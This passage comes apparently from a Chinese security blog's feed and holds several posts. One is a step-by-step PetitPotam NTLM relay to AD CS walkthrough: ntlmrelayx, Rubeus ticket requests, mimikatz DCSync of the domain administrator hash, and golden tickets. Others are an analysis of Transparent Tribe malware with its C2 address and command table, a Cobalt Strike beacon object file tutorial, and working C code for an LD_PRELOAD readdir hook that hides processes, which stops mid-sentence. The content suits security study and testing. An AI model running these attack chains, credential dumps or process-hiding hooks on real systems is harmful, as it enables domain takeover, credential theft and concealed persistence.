CS(证书服务器):Windows Server 2008 IP:192.168.93.141<br>Attack Kali IP:192.168.93.133</p><p>准备的工具:</p><ul><li>Rubeus 1.6.4</li><li>mimikatz</li><li>impacket分支(ntlmrelayx-adcs-attack)</li></ul><p>环境搭建过程：<br>（由小离提供的教程）<br><a href="https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf" target="_blank" rel="noopener">https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。作为在http://<adcsserver>/certsrv/ 上运行的 IIS 托管的 ASP Web 注册应用程序公开</adcsserver></li><li>证书注册服务 (CES)，通过安装证书注册 Web 服务角色。通过安装证书注册策略 Web 服务角色，与证书注册策略 (CEP) Web 服务协同工作。白皮书中的详细信息。</li><li>网络设备注册服务 (NDES)，通过安装网络设备注册服务 角色。作为白皮书中描述的一系列接口公开。</li><li>注册 HTTP 端点没有启用 HTTPS/没有启用任何 NTLM 中继保护（默认允许NTLM）</li><li>GPO 禁用 NTLM 身份验证或将关联的 IIS 应用程序配置为仅接受 Kerberos 身份验证</li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证（运行响应程序或 ntlmrelayx）</li><li>使用 ntlmrelayx 使用“KerberosAuthentication”或“DomainControllers”AD CS 模板将 DC 的凭据中继到启用了 Web 注册（必须启用 NTLM 身份验证并默认启用）的 AD CS（Active Directory 证书服务）服务器。</li><li>获取通过NTLM中继获取的Base64 PKCS12证书</li><li>使用Base64 PKCS12 cert导入Kekeo请求TGT（Ticket Granting Ticket）</li><li>使用 mimikatz 为选择的用户（管理员、Krbtgt 等）转储 LSA 机密</li><li>记下域管理员用户的 NT 哈希值</li><li>使用 wmiexec 以该用户身份获得对域控制器的执行并执行 NT 哈希的哈希传递</li></ol><p>前三步流程图<br><img src="https://z3.ax1x.com/2021/08/07/fMckuT.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载新版impacket切换到ntlmrelayx-adcs-attack分支</p><pre><code>git clone https://github.com/ExAndroidDev/impacket.git # Clone the custom ntlmrelayx repocd impacketgit checkout ntlmrelayx-adcs-attack # checkout to the right branch - this caught me outsudo pip3 install -r requirements.txtsudo python3 setup.py install</code></pre><p>开启监听</p><pre><code>sudo python3 ntlmrelayx.py -debug -smb2support --target http://192.168.93.246/certsrv/certfnsh.asp --adcs --template DomainController</code></pre><p>注：这里模板必须要用DomainController，否则出现以下问题<br><img src="https://z3.ax1x.com/2021/08/07/fMgCIH.jpg" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgwFJ.png" alt="开启监听"></p><p>证书机器执行</p><pre><code>PetitPotam.exe &lt;Attack_IP&gt; &lt;DC_IP&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fMgfFH.png" alt="（执行后在监听那边可以收到base64，这里可能不会出现Attack Sucess关键字但还是成功的）"></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgLTg.png" alt=""></p><p>利用Rubeus获取TGT导入到当前进程</p><pre><code>Rubeus.exe asktgt /outfile:kirbi /user:WIN-0ASLVBO5ID9$ /ptt /certificate:&lt;Base64&gt; #这里的/user为/user:&lt;DC的机器名&gt;$</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2fBT.png" alt=""></p><p>利用mimikatz导出域管哈希</p><pre><code>lsadump::dcsync /user:Administrator</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2IN4.png" alt=""></p><p>wmicexec.py连接即可<br><img src="https://z3.ax1x.com/2021/08/07/fMRPgI.png" alt=""></p><p>或者也可以dump krbtgt的hash生成金票<br><img src="https://z3.ax1x.com/2021/08/07/fMRADf.png" alt=""></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>IIS关闭NTLM验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRK8s.png" alt=""></p><p>只允许kerberos验证<br><img src="https://z3.ax1x.com/2021/08/07/fMR1K0.png" alt=""></p><p>GPO关闭NTLM身份验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRJVU.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/" target="_blank" rel="noopener">https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/</a><br><a href="https://www.youtube.com/watch?v=K0N90sI_GhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=K0N90sI_GhI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;最近披露的几个漏洞，分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MS-EFSRPC – 又名 PetitPotam&lt;/li</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>透明部落近期利用印度国防部会议记录为诱饵的攻击活动分析</title>
    <link href="http://422926799.github.io/posts/2e79283e.html"/>
    <id>http://422926799.github.io/posts/2e79283e.html</id>
    <published>2021-08-06T17:44:09.000Z</published>
    <updated>2021-08-06T17:56:18.868Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p><p>微步沙箱：<a href="https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013</a><br>md5:7f1f7c5c4b6b486e5ba9340944036285<br><img src="https://z3.ax1x.com/2021/08/07/fuOagU.png" alt=""></p><p>执行恶意VBA分析<br>（先调用shoby_leLedr函数）<br><img src="https://z3.ax1x.com/2021/08/07/fuOBDJ.png" alt=""></p><p>释放C:\ProgramData\HDM Media\davivthain.exe和诱饵文件<br><img src="https://z3.ax1x.com/2021/08/07/fuODb9.png" alt=""></p><p>诱饵文件写入<br><img src="https://z3.ax1x.com/2021/08/07/fuOyU1.png" alt=""></p><p>davivthain.exe<br>md5:3c2b45a6d878cc9f30a5dc10abf400a1</p><blockquote><p>检查是否存在C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip，存在则将其进行解压并执行<br><img src="https://z3.ax1x.com/2021/08/07/fuOgC6.png" alt=""></p></blockquote><p>若C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip不存在，则将创建C:\ProgramData\Hithviwia目录，并通过getWin()函数读取资源数据，并根据操作系统版本选择相应内容保存为trbgertrnion.zip文件，解压执行<br><img src="https://z3.ax1x.com/2021/08/07/fuORgO.png" alt=""></p><p>getShin函数<br>获取操作系统版本，判断“wia07”和“wia08”文件是否存在，若存在则将其删除，然后从资源文件“Resources.data”读取数据保存为data.zip，并解压到C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates，再根据操作系统版本读取相应的文件内容。<br><img src="https://z3.ax1x.com/2021/08/07/fuOWvD.png" alt=""></p><p>drmaiprave.exe<br>md5:77c29d464efcae961424ae050453ef11<br>首先设置开机自启<br><img src="https://z3.ax1x.com/2021/08/07/fuOhKe.png" alt=""></p><p>完成初始化操作之后便开始与C2通信<br>（C2 IP:66.154.112.206 PORT:6188，如果端口连接失败从数组元素挨个测试）<br><img src="https://z3.ax1x.com/2021/08/07/fuO4DH.png" alt=""></p><p>IP解码<br><img src="https://z3.ax1x.com/2021/08/07/fuO5bd.png" alt=""><br><img src="https://z3.ax1x.com/2021/08/07/fuOoVA.png" alt=""></p><p>c2对应的指令解析<br><img src="https://z3.ax1x.com/2021/08/07/fuO75t.png" alt=""></p><p>c2指令   对应函数       操作<br>gey7tavs machine_procss 进程枚举<br>thy7umb  images_details GIF录制<br>pry7ocl  save_apps      开机自启注册表添加<br>doy7wf   download_file  文件保存<br>scy7rsz  dsk_scrn_size  设置截屏大小<br>fiy7lsz     ile_details    文件详情获取<br>csy7dcrgn seye_scren    屏幕截图<br>diy7rs    show_send_drives 硬盘数量枚举<br>dey7lt    tras_files     文件删除<br>afy7ile   seynd_auto    文件上传<br>udy7lt    remove_account 当前路径保存名为iaknhan.exe并运行<br>liy7stf   see_folders   文件夹遍历获取目录下的文件名（包括文件详细信息获取）<br>iny7fo    account_infos 系统版本号和当前进程所在路径获取<br>ruy7nf    Process.Start(procss_type[1].Split(new char[]{‘&gt;’})[0]);  运行指定进程<br>fiy7le    move_files    文件移动<br>fly7es    see_files     文件夹遍历获取文件名</p><p><img src="https://z3.ax1x.com/2021/08/07/fuObPP.png" alt=""></p><p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接：&lt;br&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/3Je-DmyQrq</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>CS 4.1 BOF开发</title>
    <link href="http://422926799.github.io/posts/e42bb01c.html"/>
    <id>http://422926799.github.io/posts/e42bb01c.html</id>
    <published>2021-07-28T13:54:39.000Z</published>
    <updated>2021-07-28T14:08:51.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BOF介绍"><a href="#BOF介绍" class="headerlink" title="BOF介绍"></a>BOF介绍</h2><p>信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BOF 是一种使用新的后开发功能快速扩展 Beacon 代理的方法。</p><h2 id="BOF是如何执行的"><a href="#BOF是如何执行的" class="headerlink" title="BOF是如何执行的"></a>BOF是如何执行的</h2><p>对于 Beacon 来说，BOF 只是一个位置无关的代码块，它接收指向某些 Beacon 内部 API 的指针。<br>对于 Cobalt Strike 而言，BOF 是由 C 编译器生成的目标文件。Cobalt Strike 解析此文件并充当其内容的链接器和加载器。这种方法允许您编写与位置无关的代码，用于 Beacon，而无需繁琐的体操来管理字符串和动态调用 Win32 API。</p><h2 id="BOF缺陷"><a href="#BOF缺陷" class="headerlink" title="BOF缺陷"></a>BOF缺陷</h2><ol><li>BOF 是调用 Win32 API 和有限 Beacon API 的单文件 C 程序。不要期望使用此机制链接其他功能或构建大型项目。</li><li>Cobalt Strike 不会将您的 BOF 链接到 libc。这意味着您仅限于编译器内部函数（例如，Visual Studio 上的 __stosb for memset）、公开的 Beacon 内部 API、Win32 API 以及您编写的函数。您可能无法通过 BOF 使用许多常用函数（例如 strlen、stcmp 等）。</li><li>BOF 在您的 Beacon 代理内部执行。如果 BOF 崩溃，有可能导致Beacon崩溃</li><li>Cobalt Strike 期望您的 BOF 是短时间运行的单线程程序。BOF 将阻止其他 Beacon 任务和功能的执行。异步或长时间运行的任务没有 BOF<br>模式。如果要构建长时间运行的功能，请考虑在牺牲进程内运行的反射 DLL。</li></ol><p>编译的方式</p><pre><code>要使用 Visual Studio 编译它：cl.exe /c /GS- hello.c /Fohello.o要使用 x86 MinGW 编译它：i686-w64-mingw32-gcc -c hello.c -o hello.o要使用 x64 MinGW 编译它：x86_64-w64-mingw32-gcc -c hello.c -o hello.o</code></pre><p>x64 beacon对应加载x64 gcc编译的bof文件，x86 beacon对应加载x86 gcc编译的bof文件</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><pre><code>* cs 4.1或者以上的版本* 从官方下载beacon.h -&gt; https://www.cobaltstrike.com/downloads/beacon.h</code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>cna主要使用的几个函数和过程：<br>先了解几个函数：</p><pre><code>* bof_pack - 打包参数传入到BOF里的函数* beacon_inline_execute - 调用BOF里面的函数</code></pre><p><strong>bof_pack</strong><br>$1 - Beacon ID<br>$2 - 打包数据的格式化字符串 -&gt; (例如Socket里的Packet操作)</p><pre><code>此函数将其参数打包成一个二进制结构，以便与&amp;beacon_inline_execute一起使用。此处的格式字符串选项对应于 BOF 文件可用的 BeaconData* C API。该 API 根据它可以打包的每种类型的要求处理数据和提示的转换。</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack</a></p><p><strong>beacon_inline_execute</strong><br>$1 - Beacon ID<br>$2 - 读取了BOF文件的数据<br>$3 - 要调用的函数名称<br>$4 - 要传递给BOF文件的打包参数</p><pre><code>执行信标对象文件</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute</a></p><p>BOF文件示例（有参数调用，无Windows API调用）:</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;void demo(char * args, int length) {    datap  parser; #参数结构定义    char * str_arg;    int    num_arg;    BeaconDataParse(&amp;parser, args, length); #准备数据解析器以从指定缓冲区中提取参数    str_arg = BeaconDataExtract(&amp;parser, NULL); #参数解析赋值于str_arg对应bof_pack函数参数2里的格式化字符串z    num_arg = BeaconDataInt(&amp;parser); #参数解析赋值于num_arg对应bof_pack函数参数2里的格式化字符串i    BeaconPrintf(CALLBACK_OUTPUT, &quot;Message is %s with %d arg&quot;, str_arg, num_arg);}</code></pre><p>cna文件示例：<br>cna调用BOF文件函数过程：</p><pre><code>* 先读取bof文件内容* 调用的函数是否需要参数* 调用函数入口点</code></pre><pre><code>alias hello {    btask($1, script_resource(&quot;demo.o&quot;));    $handle = openf(script_resource(&quot;demo.o&quot;)); #读取BOF文件    $data   = readb($handle, -1); #读取BOF文件内容    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;Raiden Mei Birthday&quot;, 413); #参数打包    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args); #调用BOF文件入口点}</code></pre><p>效果如下:<br><img src="https://z3.ax1x.com/2021/07/28/W7sow9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/28/W7yBp6.png" alt=""></p><p>调用Windows API<br>下载<a href="https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式" target="_blank" rel="noopener">https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式</a><br>（自己测试的时候获取失败了，不过看了一下人手转BOF格式也可以）</p><pre><code>python3 bof_helper.py DsGetDcNameA██████╗  ██████╗ ███████╗██╔══██╗██╔═══██╗██╔════╝██████╔╝██║   ██║█████╗██╔══██╗██║   ██║██╔══╝██████╔╝╚██████╔╝██║╚═════╝  ╚═════╝ ╚═╝BOF Helper by @dtmsecurity[Library] DsGetDcNameA is probably in NetApi32[Declaration] DWORD WINAPI DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);[BOF Helper]DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yojS.png" alt=""></p><p>例如CreateProcessA</p><pre><code>BOOL CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>到了BOF就变成这样<br>DECLSPEC_IMPORT WINBASEAPI &lt;类型&gt; &lt;API类型&gt; DLL名$&lt;从DLL里面导出的API名称&gt;</p><pre><code>DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>更多示例</p><pre><code>DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);</code></pre><p>demo2.c （无参数，windows API调用）</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);void demo(char * args, int length) {    STARTUPINFOA si = { 0 };    si.cb = sizeof(si);    PROCESS_INFORMATION pi = { 0 };    BOOL Test = KERNEL32$CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);}</code></pre><p>demo.cna</p><pre><code>alias hello {    btask($1, script_resource(&quot;demo2.o&quot;));    $handle = openf(script_resource(&quot;demo2.o&quot;));    $data   = readb($handle, -1);    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;&quot;, 0);    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args);}</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yv90.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-beacon-object-files</a><br><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html</a><br><a href="http://evilash.me/2020/08/18/BOF.html" target="_blank" rel="noopener">http://evilash.me/2020/08/18/BOF.html</a><br><a href="https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c" target="_blank" rel="noopener">https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c</a> - 这个例子不错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BOF介绍&quot;&gt;&lt;a href=&quot;#BOF介绍&quot; class=&quot;headerlink&quot; title=&quot;BOF介绍&quot;&gt;&lt;/a&gt;BOF介绍&lt;/h2&gt;&lt;p&gt;信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BO</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>Linux 通过LD_PRELOAD实现进程隐藏</title>
    <link href="http://422926799.github.io/posts/906527f2.html"/>
    <id>http://422926799.github.io/posts/906527f2.html</id>
    <published>2021-07-26T09:20:12.000Z</published>
    <updated>2021-07-26T10:13:28.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LD-PRELOAD介绍"><a href="#LD-PRELOAD介绍" class="headerlink" title="LD_PRELOAD介绍"></a>LD_PRELOAD介绍</h2><p>好问题！实际上，/etc/ld.so.preload在某种程度上取代了LD_PRELOAD。<br>由于安全问题，LD_PRELOAD受到严格限制：它不能执行任意setuid二进制文件，因为如果可以，您可以用您自己的恶意代码替换库例程，例如参见此处的一个很好的讨论。事实上，你可以在ld.so’user manual 中阅读：</p><blockquote><p>LD_PRELOAD 要在所有其他库之前加载的附加、用户指定的 ELF 共享库列表。列表的项目可以用空格或冒号分隔。这可用于选择性地覆盖其他共享库中的函数。使用描述下给出的规则搜索库。对于 set-user-ID/set-group-ID ELF 二进制文件，包含斜杠的预加载路径名将被忽略，并且只有在库文件上启用了 set-user-ID 权限位时才会加载标准搜索目录中的库。<br>相反，文件/etc/ld.so.preload没有这样的限制，这个想法是，如果你可以读/写目录/etc，你已经拥有 root 凭据。因此它的使用。请记住，您可以使用/etc/ld.so.preload即使您一开始似乎没有：它只是glibc 的一个特性，因此是所有 Linux 发行版的一个特性（但不是，最好的我对 Unix 风格的了解），因此您可以创建它并将任何Linux 发行版中的任何setuid 库的名称放入其中，它就会起作用。</p></blockquote><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p><img src="https://z3.ax1x.com/2021/07/26/WfYGh6.png" alt=""><br>（也不知道这两个函数怎么知道是系统调用抽出来的）</p><p>ps命令获取进程过程：</p><pre><code>* openat打开/proc/&lt;pid&gt;/&lt;file&gt;* read读取* write输出</code></pre><p>通过执行<code>strace -f ps -elf 2&gt;&amp;1</code>即可得出结论<br><img src="https://z3.ax1x.com/2021/07/26/WfYo40.png" alt=""></p><p>上面那个github的原理就是hook了readdir。github上面那个通过利用循环里的continue跳过匹配的进程返回，但是会造成bug，稍微修改了一下，最终结果如下</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp); //获取目录流文件描述符    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd); //拼接路径得到目录流文件路径    ssize_t ret = readlink(tmp, buf, size); //读取符号链接的值 (读取链接的目录)    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) { //枚举出PID目录        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid); //拼接得到/porc/&lt;pid&gt;/stat文件路径    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf); //读取完/porc/&lt;pid&gt;/stat文件内容匹配出进程名称    return 1;}static struct dirent* (*original_readdir)(DIR*) = NULL; //构造readdir函数原型 https://linux.die.net/man/3/readdirstatic const char* process_to_filter = &quot;ruby&quot;; //需要被隐藏的进程名称struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;); //通过dlsym来获取readdir函数地址                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        dp=original_readdir(dirp); //通过调用readdir函数读取目录        char dirname[256];        char processname[256];        get_dir_name(dirp,dirname,sizeof(dirname)); //获取当前所在目录        if(strcmp(dirname,&quot;/proc&quot;)==0){ //目录文件等于/proc                get_process_name(dp-&gt;d_name,processname);  //由于目录文件是/proc，那么文件名(d_name)肯定是pid，所以获取要打开的文件名                if(strcmp(processname,process_to_filter)==0){ //当进程名称符合要屏蔽的进程名不返回                }else{                        return dp;                }        }}</code></pre><p>while循环continue屏蔽</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)static struct dirent* (*original_readdir)(DIR*) = NULL;static const char* process_to_filter = &quot;ruby&quot;;struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;);                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        while(1){                dp=original_readdir(dirp);                char dirname[256];                char processname[256];                get_dir_name(dirp,dirname,sizeof(dirname));                if(strcmp(dirname,&quot;/proc&quot;)==0){                        get_process_name(dp-&gt;d_name,processname);                        if(strcmp(processname,process_to_filter)==0){                                continue;                        }                }                break;        }        return dp;}</code></pre><p>静态编译:<br><code>gcc -shared -fpic example.c -o example.so</code><br><code>LD_PRELOAD=/home/kali/Desktop/example.so /usr/bin/ps -elf</code> #指定程序使用</p><p>从这些code里面可以明白写LD HOOK的时候，需准备以下操作：</p><pre><code>* 被HOOK的目标函数是否通过libc抽象出来调用的，比如说getuid这种就不是。C原生的，非C原生的都要HOOK C原生函数* 实例化被HOOK函数原型* 通过dlsym寻找被HOOK原函数的地址，赋予定义的函数原型变量* 调用原函数获取内容，判断后是否要return</code></pre><p>PS:最好还是用while continue屏蔽</p><p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p><h2 id="etc-ld-so-preload测试的问题"><a href="#etc-ld-so-preload测试的问题" class="headerlink" title="/etc/ld.so.preload测试的问题"></a>/etc/ld.so.preload测试的问题</h2><p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题) -&gt; 匹配到不是进程名称的就return返回<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/26/WfsYOx.png" alt=""><br>（测试遇到这个问题先删除so，在删除/etc/ld.so.preload）</p><p>while循环continue虽然可以避免这个问题，但是执行ps的时候会出现bug<br><img src="https://z3.ax1x.com/2021/07/26/WfswkD.png" alt=""></p><p>防止这种操作蒙蔽双眼：<br>I、检查LD_PRELOAD环境变量是否有异常<br>II、检查ld.so.preload 